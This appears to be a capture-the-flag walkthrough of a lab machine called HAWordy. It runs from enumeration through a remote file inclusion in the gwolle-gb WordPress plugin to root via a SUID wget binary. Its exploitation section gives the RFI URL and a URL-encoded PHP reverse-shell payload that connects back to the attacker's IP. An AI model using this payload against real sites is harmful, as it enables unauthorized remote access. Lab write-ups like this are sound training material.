HAWordy

Target IP: 192.168.195.23

Scanning


There is only one TCP port open on the target machine: HTTP at port 80.

Enumeration

Port 80: HTTP

Running a directory search against this port leads to interesting result. The target host seems to be running WordPress application too!

/info.php

This webpage displays the IP address of the target machine. Is a command being run using PHP to print out the IP?

/notes.txt

This page gives me a hint to perform a directory search for zip files.


Using the command gobuster dir -u http://192.168.195.23 -w /usr/share/wordlists/dirb/big.txt -x zip, I located the location of the zip file and downloaded it on my machine. This zip file contains a text file with the name link.txt. However, it asks for the password when trying to extract the file.


When trying to crack the password of the hash, I have no luck. Maybe I will obtain the password from enumeration?

/wordpress

The wordpress application displays the webpage above. The target seems to be running WordPress 5.2.3.


Using the command wpscan --url http://192.168.195.23/wordpress/ --enumerate u --plugins-detection aggressive, I gained valuable information about the target. There are two users of the website: admin and aarti.



The target host is using the plugin gwolle-gb 1.5.3 and it is vulnerable to RFI. Time to leverage this exploit to gain a reverse shell connection.

Exploitation


The exploit contains the message above. According to this exploit, I have to do the following

  • Create a file called wp-load.php that contains the reverse shell
  • Start a server so the wp-load.php file be accessed using RFI
  • Use http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website] to access the exploit from target host


I created the simple PHP web-shell above and named it as wp-load.php, and I started a Python server on the same directory to host this file using the command python3 -m http.server 80.

I browsed to http://192.168.195.23/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.45.167/&cmd=whoami;id;ls and I can now access the web-shell! The picture contains the output from the remote host executing whoami;id;ls commands.Time to obtain a reverse shell connection!


I used the payload below to gain a reverse shell connection. I started a listener on port 8443. After sending the payload, I gained a connection back! Now I have a foothold on the machine.
Payload used: php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.167%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
Full URL with payload: http://192.168.195.23/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.45.167/&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.167%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Privilege Escalation


I obtained the username and password raj:123 from wp-config.php. There is a user called raj, but this password did not work when trying to switch user.


Running find / -perm -u=s 2>/dev/null shows the binary /usr/bin/wget has SUID bit set!


By exploiting this SUID binary, I now have a root shell. GG.

Flags

The proof.txt flag once I used /usr/bin/wget binary to gain a root shell.
